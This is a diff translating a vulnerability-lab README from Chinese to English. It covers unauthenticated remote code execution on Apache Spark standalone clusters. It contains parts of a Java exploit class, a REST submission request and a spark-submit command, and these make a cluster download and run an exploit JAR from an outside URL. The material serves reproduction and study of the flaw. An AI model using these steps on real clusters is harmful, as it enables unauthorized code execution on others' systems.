@@ -1,32 +1,34 @@
-# Apache Spark 未授权访问漏洞
+# Apache Spark Unauthorized Access Leads to Remote Code Execution
 
-Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-参考链接：
+Apache Spark is a cluster computing system that allows users to submit applications to the management node for cluster execution. If the management node has not enabled ACL (Access Control List), it becomes possible to execute arbitrary code in the cluster.
+
+Reference links:
 
  - https://weibo.com/ttarticle/p/show?id=2309404187794313453016
  - https://xz.aliyun.com/t/2490
 
-## 漏洞环境
+## Vulnerability Environment
 
-执行如下命令，将以standalone模式启动一个Apache Spark集群，集群里有一个master与一个slave：
+Execute the following command to start an Apache Spark cluster in standalone mode, which includes one master and one slave:
 
 ```
 docker compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080`即可看到master的管理页面，访问`http://your-ip:8081`即可看到slave的管理页面。
+After the environment starts, visit `http://your-ip:8080` to access the master's management page, and `http://your-ip:8081` to access the slave's management page.
 
-## 漏洞利用
+## Vulnerability Reproduce
 
-该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。
+The essence of this vulnerability is that unauthorized users can submit an application to the management node, where this application is actually malicious code.
 
-提交方式有两种：
+There are two ways to submit applications:
 
-1. 利用REST API
-2. 利用submissions网关（集成在7077端口中）
+1. Using REST API
+2. Using submissions gateway (integrated in port 7077)
 
-应用可以是Java或Python，就是一个最简单的类，如（参考链接1）：
+The application can be written in Java or Python. Here's a simple example class (from reference link 1):
 
 ```java
 import java.io.BufferedReader;
@@ -65,11 +67,11 @@ public class Exploit {
 }
 ```
 
-将其编译成JAR，放在任意一个HTTP或FTP上，如`https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar`。
+Compile it into a JAR file and host it on any HTTP or FTP server, for example: `https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar`.
 
-### 用REST API方式提交应用
+### Submitting Application via REST API
 
-standalone模式下，master将在6066端口启动一个HTTP服务器，我们向这个端口提交REST格式的API：
+In standalone mode, the master starts an HTTP server on port 6066. We can submit a REST-formatted API request to this port:
 
 ```
 POST /v1/submissions/create HTTP/1.1
@@ -104,26 +106,26 @@ Content-Length: 680
 }
 ```
 
-其中，`spark.jars`即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数。
+Here, `spark.jars` is the compiled application, mainClass is the class to run, and appArgs are the parameters passed to the application.
 
 ![](1.png)
 
-返回的包中有submissionId，然后访问`http://your-ip:8081/logPage/?driverId={submissionId}&logType=stdout`，即可查看执行结果：
+The response will contain a submissionId. You can then view the execution results by visiting `http://your-ip:8081/logPage/?driverId={submissionId}&logType=stdout`:
 
 ![](2.png)
 
-注意，提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实战中，由于slave可能有多个。
+Note: While the application is submitted to the master, the results are viewed in the slave that actually executes the application (default port 8081). In real-world scenarios, there might be multiple slaves.
 
-### 利用submissions网关
+### Using the Submissions Gateway
 
-如果6066端口不能访问，或做了权限控制，我们可以利用master的主端口7077，来提交应用。
+If port 6066 is inaccessible or has access controls, we can use the master's main port 7077 to submit applications.
 
-方法是利用Apache Spark自带的脚本`bin/spark-submit`：
+This can be done using Apache Spark's built-in script `bin/spark-submit`:
 
 ```
 bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id
 ```
 
-如果你指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。
+If the master parameter you specify is a REST server, this script will first try to submit the application using the REST API; if it's not a REST server, it will fall back to using the submission gateway.
 
-查看结果的方式与前面一致。
+The results can be viewed in the same way as described above.
